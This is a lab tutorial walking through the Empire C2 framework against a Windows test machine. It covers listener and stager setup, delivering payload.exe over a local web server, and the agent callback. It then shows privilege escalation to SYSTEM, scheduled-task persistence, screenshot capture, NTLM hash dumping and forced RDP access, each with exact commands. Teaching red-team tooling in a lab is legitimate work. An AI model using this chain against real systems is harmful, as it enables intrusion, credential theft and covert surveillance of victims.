# Using Empire C2
---
- GitHub - https://github.com/EmpireProject/Empire
- Website - https://github.com/EmpireProject/Empire

In this demonstration, we will exploit using the `Empire C2 post-exploitation framework`. After exploiting a target machine we will have the opportunity to use a variety of modules which we'll use to take screenshots of the victim machine and enable RDP.

![[images/empire_logo.png]]
# Installation
---
First, let's start by installing `powershell-empire`. Make sure to run `sudo apt install update` beforehand.

![[images/picture1.png]]

---
Now that we have it installed, let's initialize the Empire server by running the following command with the `server` argument.
```commandline
sudo powershell-empire server
```

![[images/picture2.png]]

---
We can create a new terminal and run the `client` argument with the same command to give us a CLI where we can access Empire.
```commandline
sudo powershell-empire client
```

![[images/picture3.png]]
![[images/picture4.png]]

---
You will notice that we have 0 listeners and 0 agents, this is normal as we haven't yet created them. Empire has over 400 modules that give easy functionality like taking screenshots and enabling rdp. We will be checking them out shortly.

Running the `help` command gives us a list of general commands we can use in Empire.

![[images/picture5.png]]
# Listeners
---
Let's start by setting up a listener with the `uselistener http` command. Keep in mind there are many other listeners but http is a great and simple one so we'll be using it for this demonstration.

![[images/picture6.png]]

---
We will leave the name of the http listener to the default name of http. Notice that the port value is set to blank, since this is required let's set it to a random port of 9595 using `set Port 9595` and then running `execute` to create it.

![[images/picture7.png]]

---
Now, let's back out and list out the current listeners by running the `listeners` command.

![[images/picture8.png]]
# Stagers
---
Now that we have the listener setup let's create a stager. We will be using the `windows_cmd_exec` stager to generate a Windows executable and later send it to the victim machine. To achieve this, we will run `usestager windows_cmd_exec`.

![[images/picture9.png]]

---
The stager requires a listener, let's use the one we created named http by running `set Listener http`. We will also set obfuscate to true using `set Obfuscate True`.

To finish it up, we will run `set OutFile payload.exe` to optionally rename the executable and run `execute` to start generating our stager.

![[images/picture10.png]]
![[images/picture11.png]]

---
If at any point you would like to check the current configuration of the listener the `options` command is available to list the new values we had added.

![[images/picture12.png]]
# Delivery
---
Now we will change our directory to `/var/lib/powershell-empire/empire/client/generated-stagers/` which is where our stager is located.

From this directory, we will run `python3 -m http.server 8080` so as to easily be able to access the files at `192.168.122.61:8080` later in the Windows machine.

![[images/picture13.png]]
# Exploitation
---
Moving over to the Windows machine, the real-time protection will be turned off as this type of stager is easily detectable and not extensively obfuscated to bypass anti-virus software.

![[images/picture14.png]]

---
We will now download the executable by browsing to `192.168.122.61:8080`. We can now click the file and keep it which will prompt us again. We will click on Keep anyway.

![[images/picture15.png]]![[images/picture16.png]]![[images/picture17.png]]

---
Running the executable gives us yet another warning, we can click on `More info` then `Run anyway`.

![[images/picture18.png]]

---
In our powershell-empire we get a new message `[+] New agent N7DM2HG3 checked in` letting us know we have successfully compromised the Windows machine.

Running the `agents` command will list all agents and some basic information about them.

![[images/picture19.png]]

---
We now see the new agent named `N7DM2HG3` calling back at the http listener. Running `interact N7DM2HG3` allows us to further interact with our agent. Here we can run modules and execute common commands.

![[images/picture20.png]]

---
At this stage, one would normally gather as much information about the victim machine as possible to attempt privilege escalation, we will skip this and re-run the payload.exe executable as administrator. This creates a new agent named `9827FNZ4*`, notice the astrisk at the end which represents the agent has administrative privileges.

![[images/picture21.png]]

---
At this point, we can ignore our old agent and proceed with `9827FNZ4`. We will interact with it and run `whoami` indicating we are running as a standard user.

![[images/picture22.png]]
# Privalange Escalation
---
Our current standard user has little use to us. To gain administrative permission we will utilize the `powershell_privesc_getsystem` module to get the system to run tasks as administrator. To use a module run the `usemodule` command followed by the module you would like to use.

![[images/picture23.png]]

---
Since we are currently interacting with the correct agent, it sets the value automatically. After the module is executed we obtain `WORKGROUP\SYSTEM` and are now able to execute administrative tasks.

![[images/picture24.png]]
# Persistence
---
Armed with this new level of access we can now create our persistence using the `powershell_persistence_elevated_schtasks` module which will call back to the http listener at a scheduled time.

![[images/picture25.png]]

---
Let's set the listener by running `set Listener http` and then execute the module. We now have persistence, we will receive a connection from this machine at `9:00 AM` every day.

![[images/picture26.png]]
# Taking Screenshots
---
Now, let's have some fun with these modules. We can use the `powershell_collection_screenshot` module to take screenshots of the victim machine. Since we are interacting with the correct agent we don't need to specify it and can simply `execute` the module.

![[images/picture27.png]]

---
After execution, the image is stored in the `/var/lib/powershell-empire/server/downloads/9827FNZ4/Get-Screenshot` directory. We can now view it by running `firefox` followed by the screenshot name.

![[images/picture28.png]]
![[images/picture29.png]]
# Hash Dumping
---
This is great and all but we can do better with RDP. Typically you would first dump the hashes of the users to later crack. We can do this with the `powershell_credentials_invoke_ntlmextract` module. This dumps the hashes of a multitude of users such as the standard user and the Administrator accounts. Now that we have the hashes, we can crack them and figure out what the user password is. After some quick cracking, the password for the `user` comes back as `user`.

![[images/picture30.png]]
# Enabling RDP
---
Now that we know the username and password of the user we can move on to enabling RDP. Here's how you would do it. First, let's start by enabling RDP on the target machine by running the `powershell_management_enable_rdp` module. In the following example, we can see the module was executed successfully and RDP is now enabled.

![[images/picture31.png]]

---
Second, we use the RDP client of our choice and specify the local IP with the correct credentials. In this example we are using xfreerdp by running `xfreerdp /u:user /p:user /v:192.168.122.228`. We then accept the certificate and connect to the victim machine.

![[images/picture32.png]]

---
And just like that, we successfully forced RDP and connected to the victim machine with an RDP client. To illustrate this we type "Yes I can!" on the opened notepad.

![[images/picture33.png]]
# Conclusion
---
We have demonstrated how to run and use the Empire C2 framework using its core functionalities involving listeners, stagers, and obtaining agents via exploitation. We have utilized modules to ease exploitation and escalate privileges to administrative permissions. These permissions were later used to gain access and RDP into the compromised machine.
